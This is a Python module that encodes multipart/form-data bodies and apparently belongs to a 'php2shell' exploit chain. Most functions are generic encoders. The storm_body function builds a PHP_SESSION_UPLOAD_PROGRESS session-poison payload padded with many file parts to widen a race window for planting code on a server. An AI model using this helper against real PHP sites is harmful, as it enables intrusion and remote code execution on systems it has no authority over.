#!/usr/bin/env python3
"""Multipart/form-data encoder (project plumbing, stdlib only).

Every knob a caller varies (boundary, field names, filename/content-type,
filler sizes) is an argument, so callers get identical wire bytes by passing
their own values.

    part(name, value, filename=None, ctype=None) -> bytes
        One `--boundary` form-data part. `filename` adds `; filename="..."`;
        `ctype` (only with a filename) adds a `Content-Type` line. `extra` is a
        raw passthrough appended after `name="..."` for exact compatibility with
        callers that pre-assembled that fragment; prefer filename/ctype.
    multipart(parts, boundary=DEFAULT_BOUNDARY) -> (body_bytes, content_type)
        Join part specs (name, value[, filename[, ctype]]) + closing boundary.
    terminator(boundary=DEFAULT_BOUNDARY) -> bytes   closing `--boundary--`.
    part_tuple(name, value, filename=None, ctype=None) -> (hdrs, value)
        A `(header line, value)` tuple for callers using the ``wrap`` convention.
    multipart_tuple(parts, boundary) -> (body_bytes, headers_dict)
        Join `(hdrs, value)` tuples via ``wrap`` + terminator for ``boundary``.
    storm_body(key, parts, boundary, ...) -> bytes
        An upload-progress poison field followed by `parts` tiny file parts
        (the file-part "storm" that stretches an rfc1867 parse); shared verbatim
        by the on-disk session-poison race callers.

Names/values accept str or bytes (str is UTF-8 encoded). Safe under `python3 -I`.
"""
from __future__ import annotations

DEFAULT_BOUNDARY = b"----P2Smultipart"
PHP2SHELL_BOUNDARY = "----php2shell6f2b1c"          # the php2shell/chain default boundary
PHP2SHELL_BOUNDARY_B = PHP2SHELL_BOUNDARY.encode()
PROGRESS_KEY = b"PHP_SESSION_UPLOAD_PROGRESS"


def multipart_default(parts):
    """multipart_tuple(parts) bound to the php2shell default boundary."""
    return multipart_tuple(parts, PHP2SHELL_BOUNDARY_B)


def _b(x) -> bytes:
    """Coerce str -> UTF-8 bytes; leave bytes/bytearray as bytes."""
    if isinstance(x, (bytes, bytearray)):
        return bytes(x)
    return str(x).encode()


def part(name, value, filename=None, ctype=None, extra: bytes = b"",
         boundary=DEFAULT_BOUNDARY) -> bytes:
    """Encode one multipart/form-data part (leading `--boundary`, trailing CRLF).

    If `extra` is given it is appended raw right after `name="..."` (exact-bytes
    passthrough). Otherwise `filename`/`ctype` build that fragment:
    `; filename="FN"` and, when `ctype` is also set, `\\r\\nContent-Type: CTYPE`.
    """
    if extra:
        frag = _b(extra)
    else:
        frag = b""
        if filename is not None:
            frag += b'; filename="' + _b(filename) + b'"'
            if ctype is not None:
                frag += b"\r\nContent-Type: " + _b(ctype)
    return (b"--" + _b(boundary) + b'\r\nContent-Disposition: form-data; name="'
            + _b(name) + b'"' + frag + b"\r\n\r\n" + _b(value) + b"\r\n")


def terminator(boundary=DEFAULT_BOUNDARY) -> bytes:
    """The closing `--boundary--\\r\\n` delimiter."""
    return b"--" + _b(boundary) + b"--\r\n"


def wrap(hdrs, value, boundary=DEFAULT_BOUNDARY) -> bytes:
    """Wrap a pre-built header line + value into one `--boundary` part.

    Companion to ``part()`` for callers that assemble the Content-Disposition
    header line themselves (the ``(hdrs, value)`` tuple form) rather than from
    name/filename/ctype. Emits ``--boundary\\r\\n{hdrs}\\r\\n\\r\\n{value}\\r\\n``.
    """
    return b"--" + _b(boundary) + b"\r\n" + _b(hdrs) + b"\r\n\r\n" + _b(value) + b"\r\n"


def multipart(parts, boundary=DEFAULT_BOUNDARY):
    """Assemble a full body from part specs and return (body, content_type).

    Each spec is a tuple `(name, value)`, `(name, value, filename)` or
    `(name, value, filename, ctype)`. The returned content_type carries the
    (decoded) boundary for a `Content-Type:` header.
    """
    body = bytearray()
    for p in parts:
        name, value = p[0], p[1]
        filename = p[2] if len(p) > 2 else None
        ctype = p[3] if len(p) > 3 else None
        body += part(name, value, filename=filename, ctype=ctype, boundary=boundary)
    body += terminator(boundary)
    bnd = boundary.decode() if isinstance(boundary, (bytes, bytearray)) else str(boundary)
    return bytes(body), "multipart/form-data; boundary=" + bnd


def part_tuple(name, value, filename=None, ctype=None):
    """Build a `(Content-Disposition header line, value)` tuple for ``wrap``."""
    hdrs = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        hdrs += f'; filename="{filename}"'
    if ctype is not None:
        hdrs += f"\r\nContent-Type: {ctype}"
    return hdrs, value


def multipart_tuple(parts, boundary):
    """Assemble ``(hdrs, value)`` tuples into (body, headers dict) for ``boundary``."""
    chunks = [wrap(hdrs, body, boundary) for hdrs, body in parts]
    chunks.append(terminator(boundary))
    body = b"".join(chunks)
    bnd = boundary.decode() if isinstance(boundary, (bytes, bytearray)) else str(boundary)
    return body, {"Content-Type": f"multipart/form-data; boundary={bnd}",
                  "Content-Length": str(len(body))}


def storm_body(key, parts, boundary, progress_key=PROGRESS_KEY,
               file_name_fmt="f%d", file_filename_fmt="x%d.bin",
               file_value: bytes = b"X") -> bytes:
    """Upload-progress poison field + `parts` one-byte file parts + terminator.

    The `parts` tiny file parts stretch the rfc1867 multipart parse so the
    poisoned `progress_key` value lingers in the session for a race window. Each
    file part has a filename but no Content-Type (matching the original callers).
    """
    chunks = [part(progress_key, key, boundary=boundary)]
    for i in range(parts):
        chunks.append(part(file_name_fmt % i, file_value,
                           filename=file_filename_fmt % i, boundary=boundary))
    chunks.append(terminator(boundary))
    return b"".join(chunks)


if __name__ == "__main__":  # smoke test (no network)
    body, ct = multipart([("a", "1"), ("f", b"X", "x.bin", "application/octet-stream")],
                         boundary=b"----demo")
    print(ct)
    print(body.decode("latin1"))
    print("storm:", len(storm_body("K", 3, b"----demo")), "bytes")
